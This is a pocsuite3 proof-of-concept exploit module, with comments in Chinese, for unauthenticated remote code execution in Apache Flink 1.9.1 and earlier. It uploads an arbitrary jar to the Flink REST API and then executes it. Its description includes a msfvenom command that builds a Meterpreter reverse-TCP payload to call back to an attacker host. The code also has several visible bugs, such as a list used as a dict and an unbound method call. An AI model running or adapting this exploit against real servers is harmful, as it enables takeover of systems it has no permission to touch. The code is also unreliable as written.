#coding:utf-8

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
import requests
import string
import os
import json

class TestPOC(POCBase):
    name = 'unauth RCE in Apache Flink version <=1.9.1'
    version = '1'
    vulID = '8081'
    author = ['henry']
    vulType = 'Remote Code Execution'
    references = 'https://twitter.com/jas502n/status/1193869996717297664'
    desc = '''
    apache flink在未授权状态下， 存在被上传任意jar文件的问题，可能导致任意代码执行
    使用前需要使用msfvenom生成payload，并修改JAR_PATH的值
    eg:
        msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f jar > /opt/rce.jar
    '''
    vulDate = '2019-11-13'
    createDate = '2019-11-13'
    updateDate = '2019-11-1'

    appName = 'Apache Flink'
    appVersion = '<= 1.9.1'
    appPowerLink = 'https://mp.weixin.qq.com/s/ArYCF4jjhy6nkY4ypib-Ag'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        result = []
        JAR_PATH = "/home/pocsuite3/pocsuite3/thirdparty/rce.jar"
        url = "http://" + self.url if "//" not in self.url else self.url 
            
        # 探测首页是否存活
        try:
            res = requests.get(url,timeout=8)
        except:
            return self.parse_output
        # if alive    
        if res.status_code== 200 and "Apache Flink Web Dashboard" in res.text:
            # 上传jar文件
            files = {'file': open(JAR_PATH, 'rb')}
            exe_URL = ''
            try:
                response = requests.post(url=url+"/jars/upload", files=files, timeout=8)
                exe_URL = self.url + "/jars/" +json.loads(response).split("/")[-1] + "/run"
            except:
                return self.parse_output
        
        
        
            # next step: execute jar
            headers = {
            '$Content-Length': '2',
            '$Accept': 'application/json, text/plain, */*',
            '$User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36',
            '$Content-Type': 'application/json;charset=UTF-8',
            '$Accept-Encoding': 'gzip, deflate',
            '$Accept-Language': 'zh-CN,zh;q=0.9',
            '$Connection': 'close',
            }
            data = '{}'

            # 执行jar文件，POST /jars/a84a1ca6-bce0-4250-9a6c-d596889cf9d6_rce.jar/run
            response2 = requests.post(url=exe_URL, headers=headers, data=data, timeout=8)
            
            if "error" not in response2.text.lower():  

                result['VerifyInfo'] = {}
                result['VerifyInfo']['INFO'] = "FLink未授权访问EXP执行成功"
                result['VerifyInfo']['URL'] = self.url
            else:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['INFO'] = "文件上传成功，但RCE失败"
        # if dead            
        else:
            pass
        return self.parse_output(result)

    def _verify(self):
        return _attack(self)
    
    
    

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)